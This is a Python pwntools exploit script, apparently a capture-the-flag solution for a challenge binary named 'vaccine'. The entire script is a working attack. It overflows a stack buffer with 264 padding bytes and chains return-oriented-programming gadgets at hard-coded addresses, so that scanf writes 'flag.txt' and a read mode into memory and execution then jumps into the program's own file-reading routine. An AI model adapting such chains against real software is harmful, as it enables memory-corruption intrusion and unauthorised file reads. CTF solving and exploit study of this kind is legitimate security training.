from pwn import *

exe = ELF('./vaccine')

#io = remote('vaccine.chal.ctf.acsc.asia', 1337)
io = exe.process()
# gdb.attach(io, api=True)
context.log_level = 'debug'

# Gadgets:
scanf = 0x0000000000401130
fgets = 0x00000000004010f0
fmt = 0x403024 # '%s'
file_loc = 0x404600
pop_rdi = 0x0000000000401443
pop_rsi_r15 = 0x0000000000401441
pop_rbp = 0x00000000004013d6
ret = 0x000000000040101a
main = 0x0000000000401236
mode = 0x404610
where_to = 0x0000000000401375

# Chain:
# Write flag.txt
print("1st chain")
io.recvuntil(b'vaccine:')
payload = b'\0'*264
payload += p64(pop_rdi) + p64(fmt)
payload += p64(pop_rsi_r15) + p64(file_loc) + p64(0)
payload += p64(scanf) + p64(ret)
payload += p64(main)

io.sendline(payload)
io.sendline(b'flag.txt')
time.sleep(0.2)

# Write r mode
print("2nd chain")
io.recvuntil(b'vaccine:')
payload = b'\0'*264
payload += p64(pop_rdi) + p64(fmt)
payload += p64(pop_rsi_r15) + p64(mode) + p64(0)
payload += p64(scanf) + p64(ret)
payload += p64(main)

io.sendline(payload)
io.sendline(b'r')
time.sleep(0.2)

print("3rd chain")
io.recvuntil(b'vaccine:')
payload = b'\0'*264
payload += p64(pop_rdi) + p64(file_loc)
payload += p64(pop_rsi_r15) + p64(mode) + p64(0)
payload += p64(pop_rbp) + p64(0x404700)
payload += p64(ret) + p64(ret)
payload += p64(where_to)
payload += p64(main)
io.sendline(payload)

io.interactive()